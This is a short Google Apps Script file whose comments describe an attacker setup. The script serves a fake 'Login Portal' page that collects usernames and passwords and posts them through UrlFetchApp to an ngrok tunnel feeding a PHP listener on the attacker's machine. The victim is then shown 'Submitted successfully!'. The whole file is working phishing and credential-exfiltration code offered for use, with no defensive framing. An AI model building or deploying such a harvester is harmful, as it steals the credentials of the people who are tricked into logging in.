// You will need: 
// google.script.com GAS script
// .PHP GAS listener on attacker
// Ngrok tunnel on attacker. (GAS forwards HTTPS TLS traffic > Ngrok > .PHP GAS listener)
// VS Studio (for Windows, check if this is the case)

function doGet() {
  var htmlOutput = HtmlService.createHtmlOutput(`

    <html>
      <body>
        <h2>Login Portal</h2>
        <form id="loginForm">
          Username: <input type="text" id="username" required><br><br>
          Password: <input type="password" id="password" required><br><br>
          <input type="button" value="Login" onclick="submitData()">
        </form>
        <div id="result"></div>

        <script>
          function submitData() {
            var username = document.getElementById("username").value;
            var password = document.getElementById("password").value;

            google.script.run.withSuccessHandler(function(response) {
              document.getElementById("result").innerHTML = response;
            }).submitToPHP(username, password);
          }
        </script>

      </body>
    </html>

  `);
  return htmlOutput;
}

function submitToPHP(username, password) {
  var url = "https://IP-HERE.ngrok-free.app/gslistener.php";  // Current active ngrok URL

  var payload = {
    username: username,
    password: password
  };

  var options = {
    method: "post",
    payload: payload,
    muteHttpExceptions: true
  };

  try {
    UrlFetchApp.fetch(url, options);
  } catch (e) {
    Logger.log("Error: " + e);
  }

  return "Submitted successfully!";
}
